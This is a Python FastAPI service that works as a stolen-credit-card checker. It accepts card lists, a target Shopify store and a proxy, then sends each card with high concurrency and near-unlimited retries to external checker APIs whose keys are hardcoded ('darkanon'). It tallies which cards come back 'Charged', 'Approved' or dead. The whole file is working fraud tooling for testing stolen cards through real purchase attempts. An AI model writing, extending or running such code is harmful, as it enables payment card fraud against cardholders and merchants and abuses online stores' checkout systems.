from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
import aiohttp
import asyncio
import os
import random
import time

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

SHOPIFY_APIS = {
    "api1": {"url": "https://api-production-6b6d.up.railway.app/shopify", "key": "darkanon"},
    "api2": {"url": "https://shimmering-celebration-production-7dd0.up.railway.app/shopify", "key": "AnonShopii2026!"},
}

# Valid final responses - stop retrying when you get these
FINAL_STATUSES = ['charged', 'order_placed', 'approved', 'expired_card', 'card_declined', 'declined']

@app.post("/check")
async def check_cards(data: dict):
    cards = data.get("cards", [])
    site = data.get("site", "")
    proxy = data.get("proxy", "")
    api_name = data.get("api", random.choice(list(SHOPIFY_APIS.keys())))
    concurrency = data.get("concurrency", 50)
    max_retries = data.get("max_retries", 999999)
    
    api = SHOPIFY_APIS.get(api_name, list(SHOPIFY_APIS.values())[0])
    
    results = []
    checked = 0
    charged = 0
    approved = 0
    dead = 0
    errors = []
    
    queue = asyncio.Queue()
    for card in cards:
        queue.put_nowait(card)
    
    semaphore = asyncio.Semaphore(concurrency)
    
    async def worker():
        nonlocal checked, charged, approved, dead
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            while not queue.empty():
                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break
                
                async with semaphore:
                    result = await check_card_with_retry(session, api, card, site, proxy, max_retries)
                    results.append(result)
                    checked += 1
                    
                    if result["status"] == "Charged":
                        charged += 1
                    elif result["status"] == "Approved":
                        approved += 1
                    elif result["status"] in ["Declined", "Expired"]:
                        dead += 1
                
                queue.task_done()
    
    workers = [asyncio.create_task(worker()) for _ in range(min(concurrency, len(cards)))]
    await asyncio.gather(*workers)
    
    return {
        "results": results,
        "total": len(results),
        "checked": checked,
        "charged": charged,
        "approved": approved,
        "dead": dead,
        "concurrency_used": concurrency,
        "api_used": api_name
    }

async def check_card_with_retry(session, api, card, site, proxy, max_retries=10):
    """Check card, retry on non-final responses"""
    
    for attempt in range(max_retries):
        try:
            url = f"{api['url']}?site={site}&cc={card}&key={api['key']}"
            if proxy:
                url += f"&proxy={proxy}"
            
            async with session.get(url) as resp:
                text = await resp.text()
                status = parse_status(text)
                
                # If we got a final response, return it
                if status in ['Charged', 'Approved', 'Expired', 'Declined']:
                    return {
                        "card": card,
                        "status": status,
                        "message": text[:500],
                        "gateway": "Shopify",
                        "price": extract_price(text),
                        "attempts": attempt + 1,
                        "site": site
                    }
                
                # If response is NO_PRODUCT, THROTTLED, ERROR, Unknown -> retry
                # but only if we haven't exceeded max retries
                if attempt < max_retries - 1:
                    await asyncio.sleep(0.5)  # small delay between retries
                    continue
        
        except Exception as e:
            if attempt < max_retries - 1:
                await asyncio.sleep(0.5)
                continue
            return {
                "card": card,
                "status": "Error",
                "message": str(e)[:200],
                "gateway": "Shopify",
                "price": "-",
                "attempts": attempt + 1
            }
    
    # Exhausted all retries without valid response
    return {
        "card": card,
        "status": "Unknown",
        "message": "Max retries reached - no valid response",
        "gateway": "Shopify",
        "price": "-",
        "attempts": max_retries
    }

def parse_status(text):
    t = text.lower()
    # Check for final valid responses
    if "charged" in t or "order_placed" in t:
        return "Charged"
    if "approved" in t:
        return "Approved"
    if "expired" in t:
        return "Expired"
    if "card_declined" in t or "declined" in t:
        return "Declined"
    # Everything else is NOT final -> should retry
    return "Unknown"

def extract_price(text):
    import re
    prices = re.findall(r'\$(\d+\.?\d*)', text)
    return prices[0] if prices else "-"

@app.get("/health")
async def health():
    return {"status": "ok", "apis": list(SHOPIFY_APIS.keys())}

if __name__ == "__main__":
    import uvicorn
    port = int(os.getenv("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
